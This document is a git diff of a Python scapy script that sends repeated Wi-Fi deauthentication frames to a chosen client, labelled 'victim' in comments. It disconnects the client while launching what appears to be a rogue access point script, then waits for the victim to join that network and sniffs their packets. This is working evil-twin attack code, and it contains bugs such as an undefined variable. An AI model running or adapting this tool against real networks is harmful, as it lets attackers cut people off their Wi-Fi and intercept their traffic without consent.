@@ -1,11 +1,18 @@
 from scapy.all import *
 import os
+import threading
 import subprocess
 import random
 from network_interface import network_interface
 from tabulate import tabulate
 import select
 from user import user
+import time
+
+
+# global variable
+flag_user_enters = True
+
 
 #function that get input but will keap run if it wont get input in 1 sec
 def get_input(prompt, timeout):
@@ -119,6 +126,37 @@ def single_network_handle_packet(pkt, users_list, chosen_network_interface):
                         users_list.get(mac_address).send_data += 1
 
 
+def handle_packets_own_network(pkt, chosen_user, wifi_mac_address):
+    global flag_user_enters
+    # this is how scapy check is a wifi packet
+    if pkt.haslayer(Dot11):
+        # Extract BSSID of the network this layer contain information about the network
+        # as the source and destination MAC addresses, as well as the wireless management frame control field
+        if pkt.type != 0 or pkt.subtype != 8:
+            check_addr1 = pkt.addr1
+            check_addr2 = pkt.addr2
+            if (check_addr1 == chosen_user and check_addr2 == wifi_mac_address) or \
+                    (check_addr1 == wifi_mac_address and check_addr2 == chosen):
+                flag_user_enters = False
+
+
+def print_packets(pkt):
+    # this is how scapy check is a wifi packet
+    if pkt.haslayer(Dot11):
+        # Extract BSSID of the network this layer contain information about the network
+        # as the source and destination MAC addresses, as well as the wireless management frame control field
+        if pkt.type != 0 or pkt.subtype != 8:
+            check_addr1 = pkt.addr1
+            check_addr2 = pkt.addr2
+            if (check_addr1 == chosen_user and check_addr2 == wifi_mac_address) or \
+                    (check_addr1 == wifi_mac_address and check_addr2 == chosen):
+                print(pkt)
+
+
+def run_script(script_name):
+    subprocess.run(['sudo','python3', script_name])
+
+
 
 iface = "wlxc83a35c2e0b7"
 channels = get_adapter_chanels(iface)
@@ -131,6 +169,7 @@ chosen_interface = None
 while True:
     # choose randome channel
     currchanel = channels[random.randint(0, len(channels)-1)]
+    currchanel = 11
     print(currchanel)
     # pass the iface(adapter to that channel)
     os.system("iwconfig %s channel %d" % (iface, currchanel))
@@ -166,7 +205,7 @@ users_list = {}
 chosen_user = None
 while True:
     # desplay the network that was choosen
-    print(f"the network you choos is :\n{chosen_network_interface}")
+    print(f"the network you choose is :\n{chosen_network_interface}")
     # change the channel to the network che
     os.system("iwconfig %s channel %d" % (iface, chosen_network_interface.CH))
     #start to sniff packets for 3 sec
@@ -189,11 +228,48 @@ while True:
         else:
             break
 
-# Create the Deauthentication frame
-deauth = RadioTap() / Dot11(addr1=chosen_user, addr2=chosen_interface, addr3=chosen_interface) / Dot11Deauth()
 
-# Send the frame
-sendp(deauth, iface=iface, count=7)
+curr_user = users_list[chosen_user]
+wifi_channel = 6
+wifi_mac_address = "c8:3a:35:c2:e0:a2"
+script_name = 'ap_setup.py'
+
+
+# run the ap_setup in another thread
+thread = threading.Thread(target=run_script, args=(script_name,))
+thread.start()
+
+# 28:cd:c4:9b:87:f5  victim
+# 5c:b1:3e:ce:bd:35  wifi
+
+while flag_user_enters:
+    # change the channel to the network che
+    os.system("iwconfig %s channel %d" % (iface, chosen_network_interface.CH))
+    # Create the Deauthentication frame
+    deauth = RadioTap() / Dot11(addr1=chosen_user, addr2=chosen_interface, addr3=chosen_interface) / Dot11Deauth()
+    # Send the frame
+
+    sendp(deauth, iface=iface, count=7)
+
+    time.sleep(1)
+
+    # desplay the network that was choosen
+    print(f"waiting until the victim logs in :\n{chosen_network_interface}")
+    print("-----------------------------------------------------------------------------------------------------------------------------")
+    print(f"the victim is  : {chosen_user}")
+    print(f"the interface is: {chosen_interface}")
+    print(f"the channel is: {chosen_network_interface.CH}")
+    print("-----------------------------------------------------------------------------------------------------------------------------")
+    # change the channel to the network che
+    os.system("iwconfig %s channel %d" % (iface, wifi_channel))
+    # start to sniff packets for 3 sec
+    sniff(iface=iface, prn=lambda pkt: handle_packets_own_network(pkt, chosen_user, wifi_mac_address),
+          timeout=3)
+
+sniff(iface=iface, prn=lambda pkt: print_packets(pkt))
+
+
+
 
 
 
